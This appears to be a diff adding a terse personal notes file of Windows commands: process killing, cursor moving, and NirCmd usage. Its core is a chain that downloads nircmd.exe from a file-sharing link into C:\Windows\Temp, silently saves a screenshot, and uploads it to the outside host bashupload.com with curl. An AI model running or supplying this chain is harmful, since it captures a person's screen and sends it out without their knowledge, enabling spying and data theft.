@@ -1,0 +1,19 @@
+//taskkill /IM "process name" /F
+//tasklist
+
+//rundll32 user32.dll,SetCursorPos
+
+//Nircmd
+
+curl -o C:\Windows\Temp\nir.exe https://download948.mediafire.com/4iramxqyqf5g/5zd5fjpggwd6j0u/nircmd.exe
+
+nir.exe savescreenshot "C:\Windows\Temp\tela.png"
+curl https://bashupload.com/ -T "C:\Windows\Temp\tela.png"
+
+https://www.nirsoft.net/utils/nircmd2.html#using
+
+https://nircmd.nirsoft.net/
+
+speak text "Firefox was closed"
+
+nircmd.exe sendkeypress
